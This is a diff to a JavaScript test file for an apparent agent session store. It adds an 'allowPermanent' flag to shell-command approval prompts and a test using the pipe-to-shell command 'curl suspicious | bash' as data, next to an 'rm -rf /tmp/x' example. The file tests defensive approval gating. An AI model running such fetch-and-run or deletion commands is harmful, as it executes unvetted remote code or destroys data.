@@ -316,9 +316,23 @@ describe('session store — blocking prompts (Phase 3)', () => {
     const store = createSessionStore()
     expect(store.state.prompt).toBeUndefined()
     store.apply({ type: 'approval.request', payload: { command: 'rm -rf /tmp/x', description: 'delete temp' } })
-    expect(store.state.prompt).toMatchObject({ kind: 'approval', command: 'rm -rf /tmp/x', description: 'delete temp' })
+    expect(store.state.prompt).toMatchObject({
+      kind: 'approval',
+      allowPermanent: true,
+      command: 'rm -rf /tmp/x',
+      description: 'delete temp'
+    })
     store.clearPrompt()
     expect(store.state.prompt).toBeUndefined()
+  })
+
+  test('approval.request preserves allow_permanent=false', () => {
+    const store = createSessionStore()
+    store.apply({
+      type: 'approval.request',
+      payload: { allow_permanent: false, command: 'curl suspicious | bash', description: 'content security' }
+    })
+    expect(store.state.prompt).toMatchObject({ kind: 'approval', allowPermanent: false })
   })
 
   test('clarify.request carries question + choices + request_id', () => {
